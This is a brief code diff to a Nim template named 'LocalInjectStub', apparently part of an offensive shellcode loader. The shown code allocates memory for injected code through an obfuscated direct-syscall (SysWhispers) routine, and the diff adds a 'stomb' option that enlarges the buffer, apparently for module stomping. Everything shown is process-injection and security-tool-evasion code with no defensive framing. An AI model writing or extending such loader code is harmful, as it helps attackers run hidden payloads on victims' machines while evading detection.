@@ -186,6 +186,8 @@ let LocalInjectStub*  = """
                         echo "[*] Buffer address: ", repr(buffer)
 
                 else:
+                    when defined(stomb):
+                        dataSz = dataSz + 0x1000
                     when defined(SysWhispers):
                         status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
                     else:
